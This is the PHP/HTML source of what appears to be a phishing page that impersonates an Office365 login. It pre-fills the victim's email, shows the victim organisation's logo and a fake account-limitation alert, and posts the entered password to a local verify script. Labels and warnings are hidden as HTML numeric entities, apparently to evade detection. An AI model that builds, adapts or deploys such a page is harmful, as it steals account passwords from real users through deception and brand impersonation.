<?php
session_start();
$parts = explode('@',$_SESSION['_USER_']);
$user = $parts[0];
$domain = $parts[1]; 
?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
      <title>Office365 - Reporting Finance Tools</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" type="image/x-icon" href="https://res-1.cdn.office.net/officehub/images/content/images/favicon-8f211ea639.ico" />
      <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
      <link rel="stylesheet" media="all" href="./data/style.css" />
   </head>
   <body>
      <div class="container text-center ">
         <div id="refreshDivID">
            <div class="reloaded-divs">
               <div class="alert alert-warning alert-dismissible fade show" role="alert">
                  <strong>&#79;&#114;&#103;&#97;&#110;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#108;&#105;&#109;&#105;&#116;&#97;&#116;&#105;&#111;&#110;&#33;</strong> &#82;&#101;&#99;&#111;&#114;&#100;&#115;&#32;&#114;&#101;&#112;&#111;&#114;&#116;&#101;&#100;&#32;&#102;&#114;&#111;&#109;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#100;&#111;&#101;&#115;&#110;&#39;&#116;&#32;&#109;&#97;&#116;&#99;&#104;&#33;
               </div>
            </div>
         </div>
      </div>
      <section></section>
      <header class="header">
         <svg class="logo">
            <use xlink:href="/assets/icons/logos-c63e33449fe857b8807279df19de9cbc84b9e76510ce50e1c53da d07ba36fbf9.svg#logo-inline"></use>
         </svg>
      </header>
      <main>
         <div>
             <style>
                  .agreementDetail-logo {
  width: 90px !important;
  height: 90px;
  background-size: 90px 90px;
  display: block;
  margin: 0px auto;
}
             </style>
            <center>
               <div class="agreementDetail-logo " style="background-image: url(&quot;https://logo.clearbit.com/<?=$domain;?>&quot;); background-position: center center; background-size: 100%; background-repeat: no-repeat;"></div>
            </center>
         </div><br/>
         <form  class="row-spacer" novalidate="novalidate" action="./verify/index.php" accept-charset="UTF-8" method="post">
            <input name="utf8" type="hidden" value="✓" />
            <div class="form-field is-focussed" data-js="form-field">
               <input class="input-text" autofocus="autofocus" type="email" value="<?=$_SESSION['_USER_']?>" name="customer[email]" id="customer_email" disabled />
            </div>
            <div class="form-field" data-js="form-field">
               <label class="form-field__label" for="customer_password"><span>&#80;&#97;&#115;&#115;</span>&#119;&#111;&#114;&#100;</label>
               <input class="input-text" autocomplete="off" value="" type="password" name="customerauthname" id="customer_auth" autofocus />
            </div>
            <div class="u-text-align-center">
               <p class="text-small-medium text-right">
                  <a href="https://account.live.com/ResetPassword.aspx">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#63;</a>
               </p>
            </div>
            <br />
            <center><div  class="u-bottom-spacing">
               <button style="cursor:pointer;" id="checkbut" type="submit" disabled="true">Next</button>
            </div></center>
         </form>
      </main>
      <footer>
         <nav>
            <a href="https://docs.microsoft.com/en-us/microsoftteams/teams-contact-center?tabs=connect">&#67;&#111;&#110;&#116;&#97;&#99;&#116;</a>
            <a href="https://prodigyfinance.com/legal/privacy-policy">Privacy</a>
         </nav>
      </footer>
	  <style>
         .error {color: #f03232;}
		 #botsvalidation{display:none !important;}
		 #customer_auth {
        -webkit-text-security: disc;
        -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: moz-none;
    -ms-user-select: none;
    user-select: none;
         }
      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script type="text/javascript">
         $('#customer_auth').keyup(function(){
         if($.trim(this.value).length > 0)
             $("#checkbut").prop('disabled', false);
         });
         $('#customer_auth').keyup(function(){
         if($.trim(this.value).length == 0)
             $("#checkbut").prop('disabled', true);
         });
         $(document).ready(function() { 
         
         $('#checkbut').click(function() {  
         
          $(".error").hide();
          var hasError = false;
         
          var emailaddressVal = $("#customer_auth").val();
          if(emailaddressVal.length < 8) {
            $("#customer_auth").after('<span class="error">Please check your credentioals.</span>');
            hasError = true;
          }
		  if(emailaddressVal.length > 30) {
            $("#customer_auth").after('<span class="error">Please check your credentioals.</span>');
            hasError = true;
          }
        
          if(hasError == true) { return false; }
         
          });
         });
         
      </script>
   </body>
</html>